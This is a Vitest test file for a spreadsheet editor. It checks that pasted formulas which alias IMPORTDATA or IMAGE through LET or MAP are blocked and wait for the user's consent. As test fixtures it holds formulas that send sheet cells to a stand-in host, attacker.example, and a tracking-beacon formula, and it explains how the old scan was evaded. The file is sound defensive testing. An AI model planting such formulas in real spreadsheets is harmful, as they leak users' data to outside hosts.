// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { editorView } from '../src/views/editor.js';
import { Doc } from '../src/lib/doc.js';
import { cellsToHtml } from '../src/core/clipboard.js';

// A web table whose cell reads =LET(f, IMPORTDATA, f("https://attacker.example/?d="&…)) passed the
// paste-time scan, which looked for IMPORTDATA( only, and fetched within a frame of landing in a
// trusted document, the sheet's cells in its address and no notice shown. Pasted now, it is
// blocked and asks, as the same formula spelled IMPORTDATA(…) always was.
function memoryStorage() {
  const m = new Map();
  return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k), clear: () => m.clear() };
}
Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true });

let view;
beforeEach(() => {
  localStorage.clear();
  vi.useFakeTimers();
  vi.stubGlobal('matchMedia', () => ({ matches: true, addEventListener() {}, removeEventListener() {} }));
  vi.stubGlobal('requestAnimationFrame', (fn) => setTimeout(fn, 0));
  vi.stubGlobal('cancelAnimationFrame', clearTimeout);
  Element.prototype.scrollIntoView = () => {};
  Element.prototype.scrollTo = () => {};
  Object.defineProperty(HTMLElement.prototype, 'clientWidth', { configurable: true, get: () => 800 });
  Object.defineProperty(HTMLElement.prototype, 'clientHeight', { configurable: true, get: () => 400 });
  vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockReturnValue({ measureText: (t) => ({ width: t.length * 7 }), font: '' });
  document.body.innerHTML = '<div id="app"></div>';
});
afterEach(() => { view?.destroy(); view = null; vi.clearAllTimers(); vi.useRealTimers(); vi.restoreAllMocks(); vi.unstubAllGlobals(); document.body.replaceChildren(); });

async function mount() {
  const doc = new Doc({ name: 'Mine', path: 'Spreadsheets/Mine.xlsx' });
  const wb = doc.wb;
  const id = wb.activeSheetId;
  wb.setInput(id, 0, 0, 'secret-salary');
  wb.setInput(id, 0, 1, '98000');
  expect(wb.externalAllowed).toBe(true);
  view = editorView({ doc, goHome: vi.fn(), openPath: vi.fn(), newDoc: vi.fn(), templateDoc: vi.fn(), importFile: vi.fn() });
  document.querySelector('#app').append(view.el);
  // Stand in for the editor's own IMPORTDATA provider (Puter's fetch) once it is installed.
  const calls = [];
  wb.setAsyncProvider('IMPORTDATA', async (text) => { calls.push(text); return [['fetched']]; });
  await vi.advanceTimersByTimeAsync(1);
  const viewport = view.el.querySelector('.grid-viewport');
  viewport.focus();
  const paste = (where, payload) => {
    view.goTo(`Sheet1!${where}`);
    const e = new Event('paste', { bubbles: true, cancelable: true });
    Object.defineProperty(e, 'clipboardData', { value: { getData: (t) => payload[t] ?? '', files: [] } });
    viewport.dispatchEvent(e);
  };
  return { doc, wb, id, paste, calls };
}
const notice = () => view.el.querySelector('.notice-bar');

it('blocks a web table cell that binds IMPORTDATA to a name and calls it, shows the notice and fetches nothing', async () => {
  const { wb, id, paste, calls } = await mount();
  const formula = 'LET(f, IMPORTDATA, f("https://attacker.example/?d="&ENCODEURL(TEXTJOIN(",",1,A1:B1))))';
  paste('D1', { 'text/plain': `=${formula}`, 'text/html': `<table><tr><td>=${formula}</td></tr></table>` });
  expect(wb.getCell(id, 0, 3).f).toBe(formula);
  expect(wb.externalAllowed).toBe(false);
  expect(wb.getValue(id, 0, 3)).toEqual({ error: '#BLOCKED!' });
  await vi.advanceTimersByTimeAsync(50);
  expect(calls).toEqual([]);
  expect(notice().hidden).toBe(false);
  // Allowed, it is the user's decision: the request goes out with the cells it names.
  [...notice().querySelectorAll('button')].find((b) => b.textContent === 'Allow').click();
  wb.getValue(id, 0, 3);
  await vi.advanceTimersByTimeAsync(50);
  expect(calls).toEqual([JSON.stringify(['https://attacker.example/?d=secret-salary%2C98000', ''])]);
});

it('blocks the same evasions arriving as this app\'s own payload or as plain text', async () => {
  const { wb, id, paste, calls } = await mount();
  paste('D2', { 'text/html': cellsToHtml([['1']], [[{ v: null, f: 'MAP($A$1, IMPORTDATA)' }]], null, null, { r: 0, c: 0 }) });
  expect(wb.getCell(id, 1, 3).f).toBe('MAP($A$1, IMPORTDATA)');
  expect(wb.externalAllowed).toBe(false);
  wb.setExternalAllowed(true);
  paste('D3', { 'text/plain': '=LET(p, IMAGE, p("https://attacker.example/pixel.png?"&A1))' }); // a tracking beacon needs no provider
  expect(wb.externalAllowed).toBe(false);
  expect(wb.getValue(id, 2, 3)).toEqual({ error: '#BLOCKED!' });
  await vi.advanceTimersByTimeAsync(50);
  expect(calls).toEqual([]);
});
